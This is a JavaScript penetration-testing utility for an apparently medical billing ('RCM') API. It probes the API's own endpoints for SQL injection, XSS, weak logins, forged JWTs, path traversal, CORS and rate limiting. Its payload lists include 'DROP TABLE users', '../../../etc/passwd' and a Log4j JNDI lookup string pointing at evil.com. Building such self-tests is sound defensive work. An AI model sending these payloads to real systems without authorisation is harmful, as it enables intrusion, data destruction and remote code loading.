/**
 * Penetration Testing Utility for RCM System
 * Automated security testing and vulnerability assessment
 */

const axios = require('axios');
const { auditLogger } = require('./auditLogger');

class PenetrationTester {
  constructor(baseURL = 'http://localhost:3000') {
    this.baseURL = baseURL;
    this.testResults = [];
    this.vulnerabilities = [];
  }

  /**
   * Run comprehensive penetration tests
   */
  async runPenetrationTests() {
    console.log('🔍 Starting Penetration Testing Suite...');
    console.log('=' .repeat(50));

    const testSuites = [
      { name: 'SQL Injection Tests', method: this.testSQLInjection.bind(this) },
      { name: 'XSS Tests', method: this.testXSS.bind(this) },
      { name: 'Authentication Tests', method: this.testAuthentication.bind(this) },
      { name: 'Authorization Tests', method: this.testAuthorization.bind(this) },
      { name: 'Input Validation Tests', method: this.testInputValidation.bind(this) },
      { name: 'Rate Limiting Tests', method: this.testRateLimiting.bind(this) },
      { name: 'CORS Tests', method: this.testCORS.bind(this) },
      { name: 'Security Headers Tests', method: this.testSecurityHeaders.bind(this) },
      { name: 'File Upload Tests', method: this.testFileUpload.bind(this) },
      { name: 'Session Management Tests', method: this.testSessionManagement.bind(this) }
    ];

    for (const suite of testSuites) {
      console.log(`\\n🧪 Running: ${suite.name}`);
      try {
        const results = await suite.method();
        this.testResults.push({
          suite: suite.name,
          results,
          timestamp: new Date().toISOString()
        });
        console.log(`  ✅ Completed: ${suite.name} (${results.length} tests)`);
      } catch (error) {
        console.error(`  ❌ Failed: ${suite.name} - ${error.message}`);
        this.testResults.push({
          suite: suite.name,
          error: error.message,
          timestamp: new Date().toISOString()
        });
      }
    }

    // Generate report
    await this.generatePenetrationReport();
    
    return {
      testResults: this.testResults,
      vulnerabilities: this.vulnerabilities,
      summary: this.generateSummary()
    };
  }

  /**
   * Test for SQL injection vulnerabilities
   */
  async testSQLInjection() {
    const tests = [];
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1' OR 1=1 --",
      "admin'--",
      "' OR 1=1#",
      "') OR ('1'='1",
      "1; SELECT * FROM users",
      "' OR 'a'='a",
      "1' UNION SELECT null,username,password FROM users--"
    ];

    const endpoints = [
      '/api/v1/rcm/claims',
      '/api/v1/auth/login',
      '/api/v1/rcm/patients',
      '/api/v1/rcm/payments'
    ];

    for (const endpoint of endpoints) {
      for (const payload of sqlPayloads) {
        try {
          // Test in query parameters
          const response = await axios.get(`${this.baseURL}${endpoint}?id=${encodeURIComponent(payload)}`, {
            timeout: 5000,
            validateStatus: () => true
          });

          const test = {
            type: 'SQL Injection',
            endpoint,
            payload,
            method: 'GET',
            statusCode: response.status,
            vulnerable: this.detectSQLInjectionVulnerability(response),
            response: response.data
          };

          tests.push(test);

          if (test.vulnerable) {
            this.vulnerabilities.push({
              type: 'SQL Injection',
              severity: 'HIGH',
              endpoint,
              payload,
              description: 'Potential SQL injection vulnerability detected'
            });
          }

        } catch (error) {
          tests.push({
            type: 'SQL Injection',
            endpoint,
            payload,
            method: 'GET',
            error: error.message,
            vulnerable: false
          });
        }

        // Test in POST body
        try {
          const response = await axios.post(`${this.baseURL}${endpoint}`, {
            data: payload,
            search: payload
          }, {
            timeout: 5000,
            validateStatus: () => true
          });

          const test = {
            type: 'SQL Injection',
            endpoint,
            payload,
            method: 'POST',
            statusCode: response.status,
            vulnerable: this.detectSQLInjectionVulnerability(response),
            response: response.data
          };

          tests.push(test);

          if (test.vulnerable) {
            this.vulnerabilities.push({
              type: 'SQL Injection',
              severity: 'HIGH',
              endpoint,
              payload,
              description: 'Potential SQL injection vulnerability detected in POST data'
            });
          }

        } catch (error) {
          // Expected for most cases
        }
      }
    }

    return tests;
  }

  /**
   * Test for XSS vulnerabilities
   */
  async testXSS() {
    const tests = [];
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\\'XSS\\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>'
    ];

    const endpoints = [
      '/api/v1/rcm/claims',
      '/api/v1/rcm/patients',
      '/api/v1/rcm/search'
    ];

    for (const endpoint of endpoints) {
      for (const payload of xssPayloads) {
        try {
          const response = await axios.get(`${this.baseURL}${endpoint}?search=${encodeURIComponent(payload)}`, {
            timeout: 5000,
            validateStatus: () => true
          });

          const test = {
            type: 'XSS',
            endpoint,
            payload,
            method: 'GET',
            statusCode: response.status,
            vulnerable: this.detectXSSVulnerability(response, payload),
            response: response.data
          };

          tests.push(test);

          if (test.vulnerable) {
            this.vulnerabilities.push({
              type: 'XSS',
              severity: 'HIGH',
              endpoint,
              payload,
              description: 'Potential XSS vulnerability detected'
            });
          }

        } catch (error) {
          tests.push({
            type: 'XSS',
            endpoint,
            payload,
            method: 'GET',
            error: error.message,
            vulnerable: false
          });
        }
      }
    }

    return tests;
  }

  /**
   * Test authentication mechanisms
   */
  async testAuthentication() {
    const tests = [];

    // Test login endpoint
    const loginTests = [
      { username: 'admin', password: 'admin' },
      { username: 'admin', password: 'password' },
      { username: 'admin', password: '123456' },
      { username: 'root', password: 'root' },
      { username: 'test', password: 'test' },
      { username: '', password: '' },
      { username: 'admin', password: '' },
      { username: '', password: 'admin' }
    ];

    for (const credentials of loginTests) {
      try {
        const response = await axios.post(`${this.baseURL}/api/v1/auth/login`, credentials, {
          timeout: 5000,
          validateStatus: () => true
        });

        const test = {
          type: 'Authentication',
          subtype: 'Weak Credentials',
          credentials,
          statusCode: response.status,
          vulnerable: response.status === 200,
          response: response.data
        };

        tests.push(test);

        if (test.vulnerable) {
          this.vulnerabilities.push({
            type: 'Authentication',
            severity: 'CRITICAL',
            description: `Weak credentials accepted: ${credentials.username}/${credentials.password}`
          });
        }

      } catch (error) {
        tests.push({
          type: 'Authentication',
          subtype: 'Weak Credentials',
          credentials,
          error: error.message,
          vulnerable: false
        });
      }
    }

    // Test JWT token manipulation
    const jwtTests = [
      'invalid.jwt.token',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
      '',
      'null',
      'undefined'
    ];

    for (const token of jwtTests) {
      try {
        const response = await axios.get(`${this.baseURL}/api/v1/rcm/claims`, {
          headers: { Authorization: `Bearer ${token}` },
          timeout: 5000,
          validateStatus: () => true
        });

        const test = {
          type: 'Authentication',
          subtype: 'JWT Manipulation',
          token,
          statusCode: response.status,
          vulnerable: response.status === 200,
          response: response.data
        };

        tests.push(test);

        if (test.vulnerable) {
          this.vulnerabilities.push({
            type: 'Authentication',
            severity: 'HIGH',
            description: `Invalid JWT token accepted: ${token.substring(0, 50)}...`
          });
        }

      } catch (error) {
        tests.push({
          type: 'Authentication',
          subtype: 'JWT Manipulation',
          token,
          error: error.message,
          vulnerable: false
        });
      }
    }

    return tests;
  }

  /**
   * Test authorization mechanisms
   */
  async testAuthorization() {
    const tests = [];

    // Test accessing admin endpoints without proper authorization
    const adminEndpoints = [
      '/api/v1/admin/users',
      '/api/v1/admin/settings',
      '/api/v1/monitoring/dashboard'
    ];

    for (const endpoint of adminEndpoints) {
      try {
        const response = await axios.get(`${this.baseURL}${endpoint}`, {
          timeout: 5000,
          validateStatus: () => true
        });

        const test = {
          type: 'Authorization',
          subtype: 'Unauthorized Access',
          endpoint,
          statusCode: response.status,
          vulnerable: response.status === 200,
          response: response.data
        };

        tests.push(test);

        if (test.vulnerable) {
          this.vulnerabilities.push({
            type: 'Authorization',
            severity: 'HIGH',
            endpoint,
            description: 'Admin endpoint accessible without authentication'
          });
        }

      } catch (error) {
        tests.push({
          type: 'Authorization',
          subtype: 'Unauthorized Access',
          endpoint,
          error: error.message,
          vulnerable: false
        });
      }
    }

    return tests;
  }

  /**
   * Test input validation
   */
  async testInputValidation() {
    const tests = [];
    const invalidInputs = [
      'A'.repeat(10000), // Very long string
      '\\x00\\x01\\x02', // Null bytes
      '../../../etc/passwd', // Path traversal
      '${jndi:ldap://evil.com/a}', // Log4j injection
      '{{7*7}}', // Template injection
      '<script>alert(1)</script>', // XSS
      'SELECT * FROM users', // SQL
      '../../windows/system32', // Windows path traversal
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' // URL encoded path traversal
    ];

    const endpoints = [
      '/api/v1/rcm/claims',
      '/api/v1/rcm/patients',
      '/api/v1/rcm/search'
    ];

    for (const endpoint of endpoints) {
      for (const input of invalidInputs) {
        try {
          const response = await axios.post(`${this.baseURL}${endpoint}`, {
            data: input,
            search: input,
            name: input
          }, {
            timeout: 5000,
            validateStatus: () => true
          });

          const test = {
            type: 'Input Validation',
            endpoint,
            input: input.substring(0, 100),
            statusCode: response.status,
            vulnerable: this.detectInputValidationVulnerability(response, input),
            response: response.data
          };

          tests.push(test);

          if (test.vulnerable) {
            this.vulnerabilities.push({
              type: 'Input Validation',
              severity: 'MEDIUM',
              endpoint,
              input: input.substring(0, 100),
              description: 'Invalid input not properly rejected'
            });
          }

        } catch (error) {
          tests.push({
            type: 'Input Validation',
            endpoint,
            input: input.substring(0, 100),
            error: error.message,
            vulnerable: false
          });
        }
      }
    }

    return tests;
  }

  /**
   * Test rate limiting
   */
  async testRateLimiting() {
    const tests = [];
    const endpoints = [
      '/api/v1/auth/login',
      '/api/v1/rcm/claims',
      '/api/v1/rcm/search'
    ];

    for (const endpoint of endpoints) {
      const requests = [];
      const startTime = Date.now();

      // Send 50 rapid requests
      for (let i = 0; i < 50; i++) {
        requests.push(
          axios.get(`${this.baseURL}${endpoint}`, {
            timeout: 5000,
            validateStatus: () => true
          }).catch(error => ({ error: error.message }))
        );
      }

      try {
        const responses = await Promise.all(requests);
        const endTime = Date.now();
        const duration = endTime - startTime;

        const rateLimited = responses.some(r => r.status === 429);
        const successfulRequests = responses.filter(r => r.status && r.status < 400).length;

        const test = {
          type: 'Rate Limiting',
          endpoint,
          totalRequests: 50,
          successfulRequests,
          rateLimited,
          duration,
          vulnerable: !rateLimited && successfulRequests > 30,
          responses: responses.slice(0, 5) // Sample responses
        };

        tests.push(test);

        if (test.vulnerable) {
          this.vulnerabilities.push({
            type: 'Rate Limiting',
            severity: 'MEDIUM',
            endpoint,
            description: `No rate limiting detected - ${successfulRequests}/50 requests succeeded`
          });
        }

      } catch (error) {
        tests.push({
          type: 'Rate Limiting',
          endpoint,
          error: error.message,
          vulnerable: false
        });
      }
    }

    return tests;
  }

  /**
   * Test CORS configuration
   */
  async testCORS() {
    const tests = [];
    const maliciousOrigins = [
      'http://evil.com',
      'https://attacker.com',
      'null',
      '*'
    ];

    for (const origin of maliciousOrigins) {
      try {
        const response = await axios.get(`${this.baseURL}/api/v1/rcm/claims`, {
          headers: { Origin: origin },
          timeout: 5000,
          validateStatus: () => true
        });

        const corsHeader = response.headers['access-control-allow-origin'];
        const vulnerable = corsHeader === '*' || corsHeader === origin;

        const test = {
          type: 'CORS',
          origin,
          corsHeader,
          statusCode: response.status,
          vulnerable,
          response: response.data
        };

        tests.push(test);

        if (vulnerable) {
          this.vulnerabilities.push({
            type: 'CORS',
            severity: 'MEDIUM',
            origin,
            description: `Permissive CORS policy allows origin: ${origin}`
          });
        }

      } catch (error) {
        tests.push({
          type: 'CORS',
          origin,
          error: error.message,
          vulnerable: false
        });
      }
    }

    return tests;
  }

  /**
   * Test security headers
   */
  async testSecurityHeaders() {
    const tests = [];
    const requiredHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection',
      'strict-transport-security',
      'content-security-policy'
    ];

    try {
      const response = await axios.get(`${this.baseURL}/api/v1/rcm/claims`, {
        timeout: 5000,
        validateStatus: () => true
      });

      for (const header of requiredHeaders) {
        const headerValue = response.headers[header];
        const present = !!headerValue;

        const test = {
          type: 'Security Headers',
          header,
          present,
          value: headerValue,
          vulnerable: !present
        };

        tests.push(test);

        if (!present) {
          this.vulnerabilities.push({
            type: 'Security Headers',
            severity: 'LOW',
            header,
            description: `Missing security header: ${header}`
          });
        }
      }

    } catch (error) {
      tests.push({
        type: 'Security Headers',
        error: error.message,
        vulnerable: true
      });
    }

    return tests;
  }

  /**
   * Test file upload security
   */
  async testFileUpload() {
    const tests = [];
    
    // This would require a file upload endpoint to test
    // For now, return empty tests
    return tests;
  }

  /**
   * Test session management
   */
  async testSessionManagement() {
    const tests = [];
    
    // Test session fixation, hijacking, etc.
    // This would require more complex session testing
    return tests;
  }

  /**
   * Detect SQL injection vulnerability in response
   */
  detectSQLInjectionVulnerability(response) {
    if (!response.data) return false;
    
    const responseText = JSON.stringify(response.data).toLowerCase();
    const sqlErrorPatterns = [
      'sql syntax',
      'mysql_fetch',
      'ora-01756',
      'microsoft ole db',
      'odbc sql server driver',
      'sqlite_error',
      'postgresql error',
      'warning: mysql'
    ];

    return sqlErrorPatterns.some(pattern => responseText.includes(pattern));
  }

  /**
   * Detect XSS vulnerability in response
   */
  detectXSSVulnerability(response, payload) {
    if (!response.data) return false;
    
    const responseText = JSON.stringify(response.data);
    return responseText.includes(payload) && !responseText.includes('&lt;');
  }

  /**
   * Detect input validation vulnerability
   */
  detectInputValidationVulnerability(response, input) {
    // Check if invalid input was accepted (status 200) or caused an error
    return response.status === 200 || response.status === 500;
  }

  /**
   * Generate penetration testing report
   */
  async generatePenetrationReport() {
    const report = {
      timestamp: new Date().toISOString(),
      testResults: this.testResults,
      vulnerabilities: this.vulnerabilities,
      summary: this.generateSummary()
    };

    const reportPath = require('path').join(__dirname, '../logs/penetration-test-report.json');
    await require('fs').promises.writeFile(reportPath, JSON.stringify(report, null, 2));

    console.log(`\\n📊 Penetration Test Report Generated: ${reportPath}`);
    
    // Log to audit system
    await auditLogger.logSecurityEvent('PENETRATION_TEST_COMPLETED', {
      totalTests: this.testResults.length,
      vulnerabilities: this.vulnerabilities.length,
      severity: this.vulnerabilities.some(v => v.severity === 'CRITICAL') ? 'CRITICAL' : 'HIGH'
    });
  }

  /**
   * Generate test summary
   */
  generateSummary() {
    const totalTests = this.testResults.reduce((sum, suite) => {
      return sum + (suite.results ? suite.results.length : 0);
    }, 0);

    const vulnerabilitiesBySeverity = this.vulnerabilities.reduce((acc, vuln) => {
      acc[vuln.severity] = (acc[vuln.severity] || 0) + 1;
      return acc;
    }, {});

    return {
      totalTestSuites: this.testResults.length,
      totalTests,
      totalVulnerabilities: this.vulnerabilities.length,
      vulnerabilitiesBySeverity,
      riskScore: this.calculateRiskScore()
    };
  }

  /**
   * Calculate overall risk score
   */
  calculateRiskScore() {
    const weights = { CRITICAL: 10, HIGH: 5, MEDIUM: 2, LOW: 1 };
    
    return this.vulnerabilities.reduce((score, vuln) => {
      return score + (weights[vuln.severity] || 0);
    }, 0);
  }
}

module.exports = {
  PenetrationTester
};